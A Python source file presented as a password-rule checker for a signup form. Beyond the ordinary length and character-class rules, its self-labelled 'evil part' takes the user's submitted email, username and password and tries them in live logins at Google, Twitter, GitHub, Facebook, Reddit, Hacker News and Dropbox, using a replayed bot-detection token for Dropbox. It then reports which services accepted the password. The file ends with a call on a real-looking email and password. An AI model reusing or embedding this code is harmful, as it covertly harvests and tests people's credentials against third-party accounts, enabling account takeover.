# -*- coding: utf-8 -*-
import requests
import string
from bs4 import BeautifulSoup
from urllib.parse import urlparse

def _get(url, session=None, **kwargs):
    headers = kwargs.get("headers") or dict()
    headers.update(requests.utils.default_headers())
    headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    kwargs["headers"] = headers
    if session:
        return session.get(url, **kwargs)
    else:
        return requests.get(url, **kwargs)

def _post(url, session=None, **kwargs):
    headers = kwargs.get("headers") or dict()
    headers.update(requests.utils.default_headers())
    headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
    kwargs["headers"] = headers
    if session:
        return session.post(url, **kwargs)
    else:
        return requests.post(url, **kwargs)

def _check_google(username, email, pw):
    with requests.Session() as session:
        r = _get("https://accounts.google.com/ServiceLogin", session=session)
        soup = BeautifulSoup(r.text, "html.parser")
        hidden_inputs = soup.find_all("input", type="hidden")
        data = {}
        for i in hidden_inputs:
            data.update({i.get('name', ''): i.get('value', '')})
        data.update({'checkConnection': 'youtube'})
        data.update({'Email': email})
        data.update({'Passwd': pw})
        r = _post("https://accounts.google.com/signin/challenge/sl/password",
                  data=data, session=session)
        return "Wrong password" not in r.text

def _check_twitter(username, email, pw):
    with requests.Session() as session:
        r = _get("https://mobile.twitter.com/login", session=session)
        tk = session.cookies.get("_mb_tk")
        if not tk or r.status_code != 200:
            r = _get("https://mobile.twitter.com/i/nojs_router?path=%2Flogin", session=session)
            r = _get("https://mobile.twitter.com/login", session=session)
            tk = session.cookies.get("_mb_tk")
        if not tk or r.status_code != 200:
            return False
        r = _post("https://mobile.twitter.com/sessions", data={
            "authenticity_token": tk,
            "session[username_or_email]": username,
            "session[password]": pw,
            "remember_me": 0,
            "wfa": 1,
            "redirect_after_login": "/home"
        }, session=session)
        url = urlparse(r.url)
        return url.path != "/login/error"

def _check_github(username, email, pw):
    with requests.Session() as session:
        r = _get("https://github.com/login", session=session)
        soup = BeautifulSoup(r.text, "html.parser")
        i = soup.select_one("input[name='authenticity_token']")
        token = i["value"]
        r = _post("https://github.com/session", session=session, data={
            "utf8": "âœ“",
            "commit": "Sign in",
            "authenticity_token": token,
            "login": username,
            "password": pw,
        })
        url = urlparse(r.url)
        return url.path != "/session" and url.path != "/login"

def _check_fb(username, email, pw):
    with requests.Session() as session:
        r = _get("https://www.facebook.com", session=session)
        if r.status_code != 200:
            return False
        r = _post("https://www.facebook.com/login.php?login_attempt=1&lwv=100", data={
            "email": email,
            "pass": pw,
            "legacy_return": 0,
            "timezone": 480,
        }, session=session)
        url = urlparse(r.url)
        return url.path != "/login.php"

def _check_reddit(username, email, pw):
    with requests.Session() as session:
        r = _get("https://www.reddit.com/login", session=session)
        if r.status_code != 200:
            return False
        r = _post("https://www.reddit.com/post/login", session=session, data={
                "op": "login",
                "dest": "https://www.reddit.com/",
                "user": username,
                "passwd": pw,
                "rem": "off"
            })
        return "incorrect username or password" not in r.text

def _check_hn(username, email, pw):
    r = _post("https://news.ycombinator.com", data={
        "goto": "news",
        "acct": username,
        "pw": pw
    }, allow_redirects=False)
    return "Bad login" not in r.text

def _check_dropbox(username, email, pw):
    with requests.Session() as session:
        r = _get("https://www.dropbox.com/login", session=session)
        t = session.cookies.get("t")
        data = {
            "is_xhr": "true",
            "t": t,
            "cont": "/",
            "require_role": "",
            "refresh_token": "",
            "email_sig": "",
            "login-sd": "7a38G2m54Vrp8o9c9848131.13-1,2,-94,-100,Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36,uaend,12147,20030107,en-US,Gecko,5,0,0,0,366003,1355753,1680,983,1680,1050,1680,424,1680,,cpen:0,i1:0,dm:0,cwen:1,non:1,opc:0,fc:0,sc:0,wrc:1,isc:0,vib:1,bat:1,x11:0,x12:1,8925,0.653795205326,743765677874.5,loc:-1,2,-94,-101,do_en,dm_en,t_en-1,2,-94,-105,0,0,0,0,1454,1152,0;1,0,0,0,1448,1515,0;0,-1,0,0,1456,411,0;0,0,0,0,1452,411,0;0,0,0,0,1441,519,0;0,0,0,0,1444,525,0;0,0,0,0,1447,520,0;1,0,0,0,1450,883,0;-1,2,-94,-102,0,0,1,0,1454,1152,0;1,0,1,0,1448,1515,0;0,-1,0,0,1456,411,0;0,0,0,0,1452,411,0;0,0,0,0,1441,519,0;0,0,0,0,1444,525,0;0,0,0,0,1447,520,0;1,0,0,0,1450,883,0;-1,2,-94,-108,0,1,1726,0,0,10,1152,0;1,2,1728,0,0,10,1152,0;2,2,6734,-2,0,0,1152;3,1,495819,-2,0,0,1152;4,3,495821,-2,0,0,1152;5,1,495922,-2,0,0,1152;6,3,495923,-2,0,0,1152;7,1,495961,-2,0,0,1152;8,3,495962,-2,0,0,1152;9,2,496016,-2,0,0,1152;10,1,496025,-2,0,0,1152;11,3,496026,-2,0,0,1152;12,2,496080,-2,0,0,1152;13,2,496128,-2,0,0,1152;14,2,496218,-2,0,0,1152;15,1,501545,16,0,8,1152;16,1,501745,-2,0,8,1152;17,3,501746,-2,0,8,1152;18,2,501817,-2,0,8,1152;19,2,501825,16,0,0,1152;20,1,502098,-2,0,0,1152;21,3,502099,-2,0,0,1152;22,1,502202,-2,0,0,1152;23,3,502203,-2,0,0,1152;24,1,502226,-2,0,0,1152;25,3,502227,-2,0,0,1152;26,2,502250,-2,0,0,1152;27,1,502289,-2,0,0,1152;28,3,502290,-2,0,0,1152;29,2,502337,-2,0,0,1152;30,2,502385,-2,0,0,1152;31,2,502432,-2,0,0,1152;32,1,502642,-2,0,0,1152;33,3,502643,-2,0,0,1152;34,2,502736,-2,0,0,1152;35,1,502778,-2,0,0,1152;36,3,502778,-2,0,0,1152;37,1,502866,-2,0,0,1152;38,3,502866,-2,0,0,1152;39,2,502937,-2,0,0,1152;40,1,502969,-2,0,0,1152;41,3,502970,-2,0,0,1152;42,2,503000,-2,0,0,1152;43,2,503088,-2,0,0,1152;44,1,503124,13,0,0,1152;45,3,503125,13,0,0,1152;46,2,503225,13,0,0,1152;47,1,868988,91,0,2,1152;48,2,931928,-2,0,0,1152;-1,2,-94,-110,0,1,6705,605,650;1,1,6706,605,650;2,1,6756,605,650;3,1,6812,605,649;4,1,6853,605,649;5,1,6908,605,649;6,1,6917,605,648;7,1,6949,605,648;8,1,6957,605,647;9,1,6964,605,647;10,1,6973,604,646;11,1,6981,604,645;12,1,6988,604,643;13,1,6997,604,641;14,1,7005,604,636;15,1,7013,603,632;16,1,7021,603,624;17,1,7029,603,608;18,1,7036,603,594;19,1,7044,603,559;20,1,7053,603,528;21,1,7061,603,509;22,1,7068,606,477;23,1,7077,611,446;24,1,7085,613,434;25,1,7093,616,413;26,1,7101,618,407;27,1,7108,620,395;28,1,7117,622,387;29,1,7124,627,376;30,1,7133,630,374;31,1,7141,639,371;32,1,7148,649,370;33,1,7156,661,370;34,1,7164,678,370;35,1,7172,696,370;36,1,7181,715,370;37,1,7188,725,370;38,1,7197,743,370;39,1,7205,775,371;40,1,7212,786,372;41,1,7221,804,374;42,1,7232,836,375;43,1,7236,846,376;44,1,7245,865,378;45,1,7253,881,378;46,1,7262,897,378;47,1,7268,911,378;48,1,7277,925,378;49,1,7284,936,378;50,1,7293,946,378;51,1,7301,950,378;52,1,7311,955,378;53,1,7317,960,376;54,1,7324,965,375;55,1,7333,967,374;56,1,7343,970,372;57,1,7349,972,371;58,1,7357,972,369;59,1,7367,973,368;60,1,7374,974,367;61,1,7383,974,365;62,1,7390,974,364;63,3,7667,974,364,1152,3;64,1,9178,1098,634;65,1,9180,1098,634;66,1,9484,1097,634;67,1,9492,1092,635;68,1,9500,1075,641;69,1,9513,1053,650;70,1,9521,999,669;71,1,9530,949,688;72,1,9536,920,697;73,1,9544,862,720;74,1,9554,796,744;75,1,9557,737,764;76,1,9570,683,783;77,1,9573,663,790;78,1,10860,611,209;79,1,10861,611,208;80,1,10872,611,208;81,1,10877,611,207;82,1,10885,611,207;83,1,10909,612,207;84,1,10940,612,207;85,1,10956,612,207;86,1,10964,612,208;87,1,10972,613,209;88,1,10980,614,210;89,1,10988,614,212;90,1,10997,614,214;91,1,11004,615,215;92,1,11013,615,217;93,1,11020,616,219;94,1,11028,616,220;95,1,11036,617,221;96,1,11044,617,223;97,1,11052,617,225;98,1,11060,618,226;99,1,11069,618,228;100,1,11077,619,230;602,3,495618,916,374,1152;603,4,495722,916,374,1152;604,2,495724,916,374,1152;704,3,497629,1149,473,-1;705,4,497691,1149,473,-1;706,2,497701,1149,473,-1;726,3,501402,1033,383,1152;727,4,501505,1033,383,1152;728,2,501506,1033,383,1152;729,2,503127,-1,-1,-1;797,3,506725,1007,309,-1;875,4,507742,864,307,-1;876,2,507746,864,307,-1;896,3,509068,856,305,-1;938,4,509721,991,305,-1;939,2,509724,991,305,-1;940,3,510113,991,305,-1;941,4,510160,991,305,-1;942,2,510161,991,305,-1;943,3,510233,991,305,-1;944,4,510303,991,305,-1;945,2,510306,991,305,-1;1203,3,1217534,1153,519,-1;1204,4,1217682,1153,519,-1;1205,2,1217691,1153,519,-1;-1,2,-94,-117,-1,2,-94,-111,0,648,-1,-1,-1;1,34212,-1,-1,-1;2,77224,-1,-1,-1;3,170878,-1,-1,-1;4,211081,-1,-1,-1;5,219791,-1,-1,-1;6,330674,-1,-1,-1;7,340039,-1,-1,-1;8,425994,-1,-1,-1;9,472172,-1,-1,-1;10,493993,-1,-1,-1;11,520260,-1,-1,-1;12,720350,-1,-1,-1;13,866871,-1,-1,-1;14,880652,-1,-1,-1;15,904393,-1,-1,-1;16,923420,-1,-1,-1;17,990650,-1,-1,-1;18,1032853,-1,-1,-1;19,1164496,-1,-1,-1;20,1208592,-1,-1,-1;-1,2,-94,-109,0,649,-1,-1,-1,-1,-1,-1,-1,-1,-1;1,34212,-1,-1,-1,-1,-1,-1,-1,-1,-1;2,77224,-1,-1,-1,-1,-1,-1,-1,-1,-1;3,170878,-1,-1,-1,-1,-1,-1,-1,-1,-1;4,211081,-1,-1,-1,-1,-1,-1,-1,-1,-1;5,219789,-1,-1,-1,-1,-1,-1,-1,-1,-1;6,330674,-1,-1,-1,-1,-1,-1,-1,-1,-1;7,340039,-1,-1,-1,-1,-1,-1,-1,-1,-1;8,425993,-1,-1,-1,-1,-1,-1,-1,-1,-1;9,472172,-1,-1,-1,-1,-1,-1,-1,-1,-1;10,493993,-1,-1,-1,-1,-1,-1,-1,-1,-1;11,520259,-1,-1,-1,-1,-1,-1,-1,-1,-1;12,720349,-1,-1,-1,-1,-1,-1,-1,-1,-1;13,866870,-1,-1,-1,-1,-1,-1,-1,-1,-1;14,880652,-1,-1,-1,-1,-1,-1,-1,-1,-1;15,904392,-1,-1,-1,-1,-1,-1,-1,-1,-1;16,923420,-1,-1,-1,-1,-1,-1,-1,-1,-1;17,990650,-1,-1,-1,-1,-1,-1,-1,-1,-1;18,1032853,-1,-1,-1,-1,-1,-1,-1,-1,-1;19,1164495,-1,-1,-1,-1,-1,-1,-1,-1,-1;20,1208592,-1,-1,-1,-1,-1,-1,-1,-1,-1;-1,2,-94,-114,-1,2,-94,-103,2,9508;2,9509;2,9509;0,22648;1,34190;0,34865;1,77203;0,156692;1,170845;0,197150;1,211051;0,217184;1,219758;0,228109;1,330653;0,334551;1,340015;0,392637;1,425976;0,439504;1,471948;0,475427;1,493953;3,495605;2,497633;2,497633;2,506728;2,506728;2,509070;2,509070;2,510116;2,510116;2,510235;2,510235;0,511326;2,511967;2,511967;2,511967;1,520224;3,520809;0,521821;2,522723;2,522723;2,522723;1,720317;3,721085;0,726969;2,727980;2,727980;2,727980;1,866846;3,868190;2,869064;2,869065;2,869065;0,872748;1,880627;0,899810;1,904373;0,912869;1,923205;3,931842;2,934571;2,934571;2,934571;0,944411;1,990610;0,1012315;1,1032827;0,1101094;1,1164274;0,1196155;1,1208573;3,1217524;2,1217541;2,1217541;-1,2,-94,-112,-1,2,-94,-115,23900321,15773322,0,11989453,11989446,0,63652542,1217709,1487531354502,1487531355749,271,15913,49,1206,2652,17,0,1217716,39436983,0,3,51-1,2,-94,-106,-1,0-1,2,-94,-70,cfp:219650718;fs:0,13,15,16,18,20,27,28,29,34,35,36,37,38,39,40,43,44,6,8;ps:,3,7,8,19;ss:true;ls:true;idb:true;tzo:300;rtc:true;cd:24;pd:24;ck:true;jv:false;dnt:-1-1,2,-94,-80,11703-1,2,-94,-116,1355759-1,2,-94,-121,;12;6",
            "signup_data": "",
            "third_party_auth_experiment": "EXPERIMENT",
            "signup_tag": "",
            "login_email": email,
            "login_password": pw,
            "remember_me": "True",
            "specter_login_tm": ""

        }
        r = _post("http://www.dropbox.com/ajax_login", session=session, data=data)
        print(r.text)
        return "Invalid email or password" not in r.text and "Oops! We couldnâ€™t find a Dropbox account matching that email." not in r.text

checks = {
    # "Twitter": _check_twitter,
    # "Facebook": _check_fb,
    # "GitHub": _check_github,
    # "Reddit": _check_reddit,
    # "Hacker News": _check_hn,
    # "Google": _check_google,
    "Dropbox": _check_dropbox
}

def check_pass(pw, email, username):
    errors = list()
    # benign part
    if len(pw) < 8:
        errors.append("Your password must be at least 8 characters long")
    upper = False
    lower = False
    number = False
    for c in pw:
        if c in string.ascii_lowercase:
            lower = True
        if c in string.ascii_uppercase:
            upper = True
        if c in string.digits:
            number = True
    if not (upper and lower and number):
        errors.append("Your password must contain at least one uppercase letter, one lowercase letter, and one number")
    if pw.lower() == email.lower() or pw.lower() == username.lower():
        errors.append("Your password must not be the same as your username or email address")
    # evil part
    if not username:
        username = email
    for check in checks:
        try:
            if checks[check](username, email, pw):
                errors.append("Your password must not be the same as your {} password".format(check))
        except:
            pass
    return errors

check_pass('S1ngapore65!', 'ian@ianluo.com', 'bsdf')